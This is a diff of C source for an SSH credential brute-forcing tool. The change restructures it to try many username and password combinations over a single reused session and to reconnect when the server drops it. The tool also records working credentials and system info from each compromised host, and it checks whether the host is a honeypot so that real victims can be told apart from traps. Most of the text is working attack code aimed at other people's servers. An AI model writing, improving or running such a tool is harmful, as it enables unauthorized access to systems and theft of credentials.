@@ -159,54 +159,6 @@ static void get_info(rawssh_session *s,char *out,int sz){
     *d=0;
 }
 
-static int try_auth(const char *ip,int port,const char *user,const char *pass,int *hp,char *info){
-    *hp=-1;info[0]=0;
-
-    sem_wait(&g_sem);
-
-    rawssh_session *ses=rawssh_session_new();
-    if(!ses){sem_post(&g_sem);return -1;}
-
-    rawssh_set_timeout(ses,g_timeout);
-    if(g_nic[0]) rawssh_bind_nic(ses,g_nic);
-
-    int rc=rawssh_connect(ses,ip,port);
-    if(rc!=RAWSSH_OK){
-        atomic_fetch_add(&G_tcp_err,1);
-        rawssh_session_free(ses);
-        sem_post(&g_sem);
-        return -1;
-    }
-    atomic_fetch_add(&G_tcp_ok,1);
-
-    rc=rawssh_handshake(ses);
-    if(rc!=RAWSSH_OK){
-        atomic_fetch_add(&G_ssh_err,1);
-        rawssh_disconnect(ses);
-        rawssh_session_free(ses);
-        sem_post(&g_sem);
-        return -1;
-    }
-    atomic_fetch_add(&G_ssh_ok,1);
-
-    rc=rawssh_auth_password(ses,user,pass);
-    if(rc!=RAWSSH_OK){
-        atomic_fetch_add(&G_wrong,1);
-        rawssh_disconnect(ses);
-        rawssh_session_free(ses);
-        sem_post(&g_sem);
-        return -1;
-    }
-
-    /* Login OK! */
-    *hp=check_hp(ses);
-    if(*hp<=0)get_info(ses,info,199);
-
-    rawssh_disconnect(ses);
-    rawssh_session_free(ses);
-    sem_post(&g_sem);
-    return 0;
-}
 
 static void save_result(Result *r){
     pthread_mutex_lock(&g_resmtx);
@@ -229,32 +181,113 @@ static void save_result(Result *r){
     pthread_mutex_unlock(&g_filemtx);
 }
 
-static void process(int idx){
-    Target *t=&g_targets[idx];
-    atomic_fetch_add(&G_active,1);
+static rawssh_session *open_session(const char *ip, int port) {
+    rawssh_session *ses = rawssh_session_new();
+    if (!ses) return NULL;
+    rawssh_set_timeout(ses, g_timeout);
+    if (g_nic[0]) rawssh_bind_nic(ses, g_nic);
 
-    for(int u=0;u<NU;u++){
-        for(int p=0;p<NP;p++){
-            atomic_fetch_add(&G_tested,1);
-            int hp;char info[200]={0};
-            if(try_auth(t->ip,t->port,U[u],P[p],&hp,info)==0){
-                atomic_fetch_add(&G_found,1);
-                if(hp==1)atomic_fetch_add(&G_hp,1);
-                else atomic_fetch_add(&G_real,1);
+    int rc = rawssh_connect(ses, ip, port);
+    if (rc != RAWSSH_OK) {
+        atomic_fetch_add(&G_tcp_err, 1);
+        rawssh_session_free(ses);
+        return NULL;
+    }
+    atomic_fetch_add(&G_tcp_ok, 1);
 
-                Result r={.port=t->port,.hp=hp};
-                strncpy(r.ip,t->ip,47);
-                strncpy(r.user,U[u],31);
-                strncpy(r.pass,P[p],31);
-                strncpy(r.info,info,199);
-                save_result(&r);
-                goto done;
-            }
+    rc = rawssh_handshake(ses);
+    if (rc != RAWSSH_OK) {
+        atomic_fetch_add(&G_ssh_err, 1);
+        rawssh_disconnect(ses);
+        rawssh_session_free(ses);
+        return NULL;
+    }
+    atomic_fetch_add(&G_ssh_ok, 1);
+    return ses;
+}
+
+static void close_session(rawssh_session *ses) {
+    if (!ses) return;
+    rawssh_disconnect(ses);
+    rawssh_session_free(ses);
+}
+
+static void process(int idx) {
+    Target *t = &g_targets[idx];
+    atomic_fetch_add(&G_active, 1);
+
+    sem_wait(&g_sem);
+
+    rawssh_session *ses = open_session(t->ip, t->port);
+    if (!ses) {
+        sem_post(&g_sem);
+        goto done;
+    }
+
+    int combo = 0;
+    int total = NU * NP;
+    int max_reconn = 50;
+    int reconn = 0;
+
+    while (combo < total) {
+        int u = combo / NP;
+        int p = combo % NP;
+        atomic_fetch_add(&G_tested, 1);
+
+        int rc = rawssh_auth_password(ses, U[u], P[p]);
+
+        if (rc == RAWSSH_OK) {
+            /* Login OK! */
+            atomic_fetch_add(&G_found, 1);
+            int hp = check_hp(ses);
+            char info[200] = {0};
+            if (hp <= 0) get_info(ses, info, 199);
+            if (hp == 1) atomic_fetch_add(&G_hp, 1);
+            else atomic_fetch_add(&G_real, 1);
+
+            Result r = {.port = t->port, .hp = hp};
+            strncpy(r.ip, t->ip, 47);
+            strncpy(r.user, U[u], 31);
+            strncpy(r.pass, P[p], 31);
+            strncpy(r.info, info, 199);
+            save_result(&r);
+
+            close_session(ses);
+            sem_post(&g_sem);
+            goto done;
+        }
+
+        if (rc == RAWSSH_AUTH_FAIL) {
+            /* Wrong password - try next combo on same session */
+            atomic_fetch_add(&G_wrong, 1);
+            combo++;
+            continue;
+        }
+
+        /* Session died (CLOSED/TCP_ERROR/TIMEOUT/PROTO_ERROR) */
+        atomic_fetch_add(&G_wrong, 1);
+        close_session(ses);
+        ses = NULL;
+
+        if (++reconn >= max_reconn) {
+            sem_post(&g_sem);
+            goto done;
+        }
+
+        /* Reconnect and retry this combo */
+        ses = open_session(t->ip, t->port);
+        if (!ses) {
+            sem_post(&g_sem);
+            goto done;
         }
     }
+
+    close_session(ses);
+    sem_post(&g_sem);
+
 done:
-    atomic_fetch_sub(&G_active,1);
-    atomic_fetch_add(&G_done,1);
+    atomic_fetch_sub(&G_active, 1);
+    atomic_fetch_add(&G_done, 1);
 }
 
 static void draw(){
